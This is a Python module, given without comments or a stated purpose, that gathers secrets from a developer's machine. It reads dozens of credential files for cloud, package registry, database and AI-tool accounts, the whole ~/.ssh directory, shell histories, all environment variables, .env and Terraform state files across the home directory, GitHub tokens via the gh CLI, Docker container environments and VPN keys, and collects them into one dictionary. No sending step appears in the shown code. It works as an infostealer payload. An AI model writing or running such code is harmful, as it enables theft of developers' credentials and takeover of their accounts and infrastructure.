import os
import json
import glob
import socket
import subprocess


_FILES = [
    "~/.gitconfig",
    "~/.git-credentials",
    "~/.config/git/credentials",
    "~/.docker/config.json",
    "~/.netrc",
    "~/.npmrc",
    "~/.config/npm/npmrc",
    "~/.yarnrc",
    "~/.yarnrc.yml",
    "~/.pypirc",
    "~/.pip/pip.conf",
    "~/.config/pip/pip.conf",
    "~/.cargo/credentials",
    "~/.cargo/credentials.toml",
    "~/.gem/credentials",
    "~/.config/composer/auth.json",
    "~/.kube/config",
    "~/.aws/credentials",
    "~/.aws/config",
    "~/.config/gcloud/application_default_credentials.json",
    "~/.azure/accessTokens.json",
    "~/.azure/azureProfile.json",
    "~/.config/gh/hosts.yml",
    "~/.config/hub",
    "~/.boto",
    "~/.s3cfg",
    "~/.pgpass",
    "~/.my.cnf",
    "~/.pulumi/credentials.json",
    "~/.config/circleci/cli.yml",
    "~/.terraform.d/credentials.tfrc.json",
    "~/.config/heroku/netrc",
    "~/.netrc",
    "~/.flyctl/config.yml",
    "~/.config/netlify/config.json",
    "~/.vercel/auth.json",
    "~/.config/doctl/config.yaml",
    "~/.bash_history",
    "~/.zsh_history",
    "~/.config/claude/claude_desktop_config.json",
    "~/Library/Application Support/Claude/claude_desktop_config.json",
    "~/.cursor/mcp.json",
    "~/.config/cursor/mcp.json",
    "~/.vscode/mcp.json",
    "~/.config/Code/User/settings.json",
    "~/.codeium/mcp.json",
    "~/.config/continue/config.json",
    "~/.continue/config.json",
    "~/.zed/settings.json",
    "~/.config/zed/settings.json",
    "~/.config/kilo/config.json",
    "~/.config/opencode/config.json",
    "~/.config/gh/config.yml",
    "~/.config/glab-cli/config.yml",
    "~/.config/atlantis/config.yaml",
    "~/.vault-token",
    "~/.influxdbv2/configs",
    "~/.config/stripe/config.toml",
    "~/.config/fly/config.yml",
    "~/.config/supabase/access-token",
    "~/.config/supabase/config.toml",
    "~/.railway/config.json",
    "~/.config/render/config.yaml",
    "~/.config/planetscale/pscale.yaml",
    "~/.config/neon/config.json",
    "~/.config/turso/config.json",
    "~/.config/wrangler/config",
    "~/.wrangler/config",
    "~/.config/cloudflare/wrangler.toml",
    "~/.sentry-cli/credentials",
    "~/.config/sentry-cli/config",
    "~/.datadogrc",
    "~/.config/datadog/datadog.yaml",
    "~/.newrelicrc",
    "~/.config/op/config",
    "~/.terraformrc",
    "~/.config/ngrok/ngrok.yml",
    "~/.ngrok2/ngrok.yml",
    "~/.config/ansible/ansible.cfg",
    "~/.ansible/ansible.cfg",
    "~/.ansible/vault_password_file",
    "~/.config/digitalocean/config.yaml",
    "~/.config/mongodb/mongosh/config",
    "~/.config/mongodb/mongosh/mongosh.log",
    "~/.m2/settings.xml",
    "~/.gradle/gradle.properties",
    "~/.sbt/credentials",
    "~/.ssh/environment",
    "~/.gnupg/gpg-agent.conf",
    "~/.gnupg/pubring.kbx",
]

_TAILSCALE_PATHS = [
    "/var/lib/tailscale/tailscaled.state",
    "/Library/Application Support/Tailscale/tailscaled.state",
    "/etc/tailscale/tailscaled.state",
]

_WIREGUARD_DIRS = [
    "/etc/wireguard",
    "/usr/local/etc/wireguard",
]

_SSH_DIR = "~/.ssh"
_HOME = os.path.expanduser("~")


def _read_file(path):
    try:
        with open(path, 'r', errors='replace') as f:
            return f.read()
    except Exception:
        return None


def _collect_files():
    result = {}
    for pattern in _FILES:
        expanded = os.path.expanduser(pattern)
        content = _read_file(expanded)
        if content is not None:
            result[pattern] = content
    return result


def _collect_ssh():
    ssh_dir = os.path.expanduser(_SSH_DIR)
    if not os.path.isdir(ssh_dir):
        return {}

    result = {}
    try:
        entries = os.listdir(ssh_dir)
    except Exception:
        return {}

    for name in entries:
        path = os.path.join(ssh_dir, name)
        if not os.path.isfile(path):
            continue
        content = _read_file(path)
        if content is not None:
            result[f"~/.ssh/{name}"] = content

    return result


def _collect_env():
    return dict(os.environ)


def _collect_dotenv_files():
    result = {}
    for root, dirs, files in os.walk(_HOME):
        dirs[:] = [d for d in dirs if not d.startswith('.')]
        for name in files:
            if name == '.env' or name.startswith('.env.'):
                path = os.path.join(root, name)
                content = _read_file(path)
                if content is not None:
                    rel = path.replace(_HOME, "~", 1)
                    result[rel] = content
    dotenv_root = _read_file(os.path.join(_HOME, '.env'))
    if dotenv_root is not None:
        result['~/.env'] = dotenv_root
    return result


def _collect_gh():
    result = {}

    for env_var in ("GH_TOKEN", "GITHUB_TOKEN", "GH_ENTERPRISE_TOKEN", "GITHUB_ENTERPRISE_TOKEN"):
        val = os.environ.get(env_var)
        if val:
            result[env_var] = val

    hosts_path = os.path.expanduser("~/.config/gh/hosts.yml")
    content = _read_file(hosts_path)
    if content is not None:
        result["hosts_file"] = content

    try:
        proc = subprocess.run(
            ["gh", "auth", "token"],
            capture_output=True, text=True, timeout=5
        )
        token = proc.stdout.strip()
        if token:
            result["gh_auth_token"] = token
    except Exception:
        pass

    try:
        proc = subprocess.run(
            ["gh", "auth", "status", "--show-token"],
            capture_output=True, text=True, timeout=5
        )
        output = proc.stdout.strip() or proc.stderr.strip()
        if output:
            result["gh_auth_status"] = output
    except Exception:
        pass

    return result


def _docker_socket_request(path):
    sock = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    sock.settimeout(5)
    sock.connect("/var/run/docker.sock")
    request = f"GET {path} HTTP/1.0\r\nHost: localhost\r\n\r\n"
    sock.sendall(request.encode())
    response = b""
    while True:
        chunk = sock.recv(4096)
        if not chunk:
            break
        response += chunk
    sock.close()
    header, _, body = response.partition(b"\r\n\r\n")
    return json.loads(body.decode())


def _collect_docker():
    result = {}

    try:
        containers = _docker_socket_request("/containers/json?all=1")
        if not isinstance(containers, list):
            raise ValueError
    except Exception:
        try:
            proc = subprocess.run(
                ["docker", "ps", "-aq"],
                capture_output=True, text=True, timeout=5
            )
            if proc.returncode != 0 or not proc.stdout.strip():
                return result
            ids = proc.stdout.strip().splitlines()
            containers = [{"Id": cid.strip()} for cid in ids]
            use_socket = False
        except Exception:
            return result
    else:
        use_socket = True

    for container in containers:
        cid = container.get("Id", "")
        if not cid:
            continue

        name = cid[:12]
        names = container.get("Names")
        if names and isinstance(names, list):
            name = names[0].lstrip("/")

        env_vars = {}

        if use_socket:
            try:
                info = _docker_socket_request(f"/containers/{cid}/json")
                env_list = info.get("Config", {}).get("Env") or []
                for entry in env_list:
                    k, _, v = entry.partition("=")
                    env_vars[k] = v
            except Exception:
                pass
        else:
            try:
                proc = subprocess.run(
                    ["docker", "inspect", "--format", "{{json .Config.Env}}", cid],
                    capture_output=True, text=True, timeout=5
                )
                if proc.returncode == 0 and proc.stdout.strip():
                    env_list = json.loads(proc.stdout.strip())
                    for entry in env_list:
                        k, _, v = entry.partition("=")
                        env_vars[k] = v
            except Exception:
                pass

        if env_vars:
            result[name] = env_vars

    return result


def _collect_tfstate():
    result = {}
    for root, dirs, files in os.walk(_HOME):
        dirs[:] = [d for d in dirs if d not in ('.git', 'node_modules', '.terraform')]
        for name in files:
            if name.endswith('.tfstate') or name.endswith('.tfstate.backup'):
                path = os.path.join(root, name)
                content = _read_file(path)
                if content is not None:
                    rel = path.replace(_HOME, '~', 1)
                    result[rel] = content
    return result


def _collect_vpn():
    result = {}

    for path in _TAILSCALE_PATHS:
        content = _read_file(path)
        if content is not None:
            result[path] = content

    try:
        proc = subprocess.run(
            ["tailscale", "status", "--json"],
            capture_output=True, text=True, timeout=5
        )
        if proc.returncode == 0 and proc.stdout.strip():
            result["tailscale_status"] = proc.stdout.strip()
    except Exception:
        pass

    try:
        proc = subprocess.run(
            ["tailscale", "debug", "prefs"],
            capture_output=True, text=True, timeout=5
        )
        if proc.returncode == 0 and proc.stdout.strip():
            result["tailscale_prefs"] = proc.stdout.strip()
    except Exception:
        pass

    for wg_dir in _WIREGUARD_DIRS:
        if not os.path.isdir(wg_dir):
            continue
        try:
            entries = os.listdir(wg_dir)
        except Exception:
            continue
        for name in entries:
            if name.endswith(".conf"):
                path = os.path.join(wg_dir, name)
                content = _read_file(path)
                if content is not None:
                    result[path] = content

    try:
        proc = subprocess.run(
            ["wg", "showconf", "all"],
            capture_output=True, text=True, timeout=5
        )
        if proc.returncode == 0 and proc.stdout.strip():
            result["wg_showconf"] = proc.stdout.strip()
    except Exception:
        pass

    return result


def collect() -> dict:
    return {
        "files": {**_collect_files(), **_collect_ssh(), **_collect_dotenv_files(), **_collect_tfstate()},
        "env": _collect_env(),
        "gh": _collect_gh(),
        "docker": _collect_docker(),
        "vpn": _collect_vpn(),
    }
